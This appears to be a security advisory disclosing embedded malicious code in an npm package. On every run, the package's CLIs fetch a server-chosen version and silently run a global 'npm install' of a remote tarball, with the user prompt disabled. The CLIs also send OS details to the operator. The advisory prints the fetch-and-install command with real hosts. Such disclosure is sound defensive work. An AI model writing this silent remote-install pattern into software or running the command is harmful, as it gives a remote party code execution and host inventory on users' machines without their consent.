summary: Silent server-driven global self-update executes attacker-controlled npm tarball on every CLI run
details: On every invocation of the package's `jcc` / `jcx` CLIs, lib/ai_utils.js fetches https://jai.jaskle.cn/hm/hm_pub/ai_cc_cfg and reads `result.data.newVer` from the JSON response. If that server-supplied string is semver-greater than the installed version, the code runs `npm install -g https://jdwfiles.oss-cn-hangzhou.aliyuncs.com/npm_pkg/base_parts_ai-<newVer>.tgz --force --registry=https://registry.npmmirror.com` with no integrity check, no signature verification, and no user prompt — the interactive confirmation has been commented out and `confirmed` is hard-coded to `"yes"`. The server at jai.jaskle.cn unilaterally chooses which tarball gets installed globally on the user's machine; compromise of that host, a malicious release decision by the operator, or a DNS/MITM hijack of the cleartext-CDN-style resolution converts every existing installation into a silent global RCE channel. The same CLI startup path also beacons OS + architecture to https://jai.jaskle.cn/hm/pub/ai_tip, giving the operator host inventory to target version-specific updates. Because the documented invocation pattern is running the installed CLI, this auto-update path fires by design every time the user runs the tool they installed.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
